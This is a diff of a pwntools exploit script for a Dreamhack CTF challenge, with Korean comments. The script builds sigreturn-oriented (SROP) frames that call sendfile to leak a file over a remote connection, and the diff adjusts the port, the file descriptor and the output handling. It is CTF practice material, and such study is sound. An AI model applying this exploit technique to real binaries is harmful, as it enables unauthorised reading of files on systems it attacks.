@@ -1,9 +1,8 @@
 from pwn import *
 
-p=remote("host3.dreamhack.games",18942)
-#p=process("./chall")
+p=remote("host3.dreamhack.games",15187)
 e=ELF("./chall")
-context.log_level='debug'
+#context.log_level='debug'
 context.arch='amd64'
 
 
@@ -32,7 +31,7 @@ f2=SigreturnFrame(kernel='amd64')
 f2.rax=0x28 #sendfile
 f2.rsp=bss+0x40 #아무거나
 f2.rdi=1
-f2.rsi=3 #디버깅
+f2.rsi=5 #디버깅
 f2.rdx=0
 f2.r10=0x30 #4번째 인자는 r10이다!!
 f2.rip=syscall
@@ -60,6 +59,7 @@ p2+=bytes(f2) #sendfile frame
 p2+=b'\x00'*0x10
 
 
+
 #gdb.attach(p)
 p.send(p1)
 pause()
@@ -68,5 +68,6 @@ pause()
 p.send(b'B'*15)
 pause()
 p.send(b'C'*15)
+print(p.recv())
 
-#p.interactive()
+p.interactive()
